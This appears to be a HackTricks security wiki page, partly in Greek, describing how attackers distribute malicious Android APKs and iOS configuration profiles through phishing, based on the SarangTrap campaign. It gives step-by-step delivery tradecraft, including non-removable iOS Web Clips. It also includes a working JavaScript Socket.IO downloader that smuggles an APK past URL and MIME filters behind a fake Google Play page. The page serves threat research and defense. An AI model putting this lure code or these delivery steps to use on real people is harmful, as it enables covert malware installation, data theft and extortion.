# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Αυτή η σελίδα καλύπτει τεχνικές που χρησιμοποιούνται από threat actors για τη διανομή **malicious Android APKs** και **iOS mobile-configuration profiles** μέσω phishing (SEO, social engineering, fake stores, dating apps, κ.λπ.).
> Το υλικό είναι προσαρμοσμένο από την εκστρατεία SarangTrap που αποκαλύφθηκε από τη Zimperium zLabs (2025) και από άλλη δημόσια έρευνα.

## Attack Flow

1. **SEO/Phishing Infrastructure**
* Καταχωρήστε δεκάδες look-alike domains (dating, cloud share, car service…).
– Χρησιμοποιήστε τοπικές λέξεις-κλειδιά και emojis στο στοιχείο `<title>` για να κατατάσσεστε στο Google.
– Host *both* Android (`.apk`) και iOS install instructions στην ίδια landing page.
2. **First Stage Download**
* Android: direct link σε ένα *unsigned* ή “third-party store” APK.
* iOS: `itms-services://` ή απλό HTTPS link σε ένα malicious **mobileconfig** profile (see below).
3. **Android Post-install Behaviour**
* C2-gated execution, permission abuse, dropper bypasses, background collection, and other post-install malware behaviour are covered in the dedicated Android Malware Post-Exploitation page below.
4. **iOS Delivery Technique**
* Ένα μοναδικό **mobile-configuration profile** μπορεί να ζητήσει `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` κ.λπ. για να εγγράψει τη συσκευή σε supervision τύπου “MDM”.
* Social-engineering instructions:
1. Open Settings ➜ *Profile downloaded*.
2. Tap *Install* three times (screenshots on the phishing page).
3. Trust the unsigned profile ➜ ο attacker αποκτά entitlement για *Contacts* & *Photo* χωρίς App Store review.
5. **iOS Web Clip Payload (phishing app icon)**
* Τα payloads `com.apple.webClip.managed` μπορούν να **pin ένα phishing URL στο Home Screen** με branded icon/label.
* Τα Web Clips μπορούν να τρέχουν **full‑screen** (κρύβουν το browser UI) και να επισημαίνονται ως **non‑removable**, αναγκάζοντας το θύμα να διαγράψει το profile για να αφαιρέσει το icon.
6. **Network Layer**
* Plain HTTP, συχνά στη θύρα 80 με HOST header όπως `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (no TLS → easy to spot).

## Android Malware Post-Exploitation

For post-install Android malware tradecraft such as C2, Accessibility abuse, overlays, ATS automation, staged DEX loading, premium SMS, and persistence, see:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Attackers increasingly replace static APK links with a Socket.IO/WebSocket channel embedded in Google Play–looking lures. This conceals the payload URL, bypasses URL/extension filters, and preserves a realistic install UX.

Typical client flow observed in the wild:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Γιατί παρακάμπτει απλούς ελέγχους:
- Δεν εκτίθεται στατικό APK URL· το payload ανακατασκευάζεται στη μνήμη από WebSocket frames.
- Τα φίλτρα URL/MIME/extension που μπλοκάρουν άμεσες .apk απαντήσεις μπορεί να χάσουν binary data που δρομολογούνται μέσω WebSockets/Socket.IO.
- Crawlers και URL sandboxes που δεν εκτελούν WebSockets δεν θα ανακτήσουν το payload.

Δείτε επίσης WebSocket tradecraft και tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Αναφορές


- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Socket.IO](https://socket.io)
- [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)

{{#include ../../banners/hacktricks-training.md}}
